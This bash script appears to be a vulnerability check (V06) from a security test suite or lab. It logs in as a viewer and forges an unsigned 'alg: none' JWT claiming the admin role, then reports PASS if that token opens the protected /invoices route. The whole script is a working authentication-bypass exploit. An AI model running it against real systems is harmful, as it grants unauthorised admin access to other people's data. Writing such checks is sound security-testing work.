#!/usr/bin/env bash
set -euo pipefail

CORE=${CORE:-http://localhost:8000}
TOKEN=$(curl -fsS "$CORE/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"viewer@acme.example","password":"Password123!"}' | jq -r '.access_token')
claims=$(curl -fsS "$CORE/users/me" -H "Authorization: Bearer $TOKEN")
sub=$(jq -r '.id' <<<"$claims")
tenant_id=$(jq -r '.tenant_id' <<<"$claims")
forged=$(python3 - "$sub" "$tenant_id" <<'PY'
import base64
import json
import sys
import time

def part(value):
    return base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()

print(f"{part({'alg': 'none', 'typ': 'JWT'})}.{part({'sub': sys.argv[1], 'tenant_id': sys.argv[2], 'role': 'admin', 'aud': 'helios', 'exp': int(time.time()) + 3600})}.")
PY
)

status=$(curl -sS -o /dev/null -w '%{http_code}' "$CORE/invoices" \
  -H "Authorization: Bearer $forged")
if [[ "$status" == "200" ]]; then
  echo "PASS V06: forged alg=none admin token accessed protected invoice route"
else
  echo "FAIL V06: forged unsigned token returned HTTP $status"
  exit 1
fi
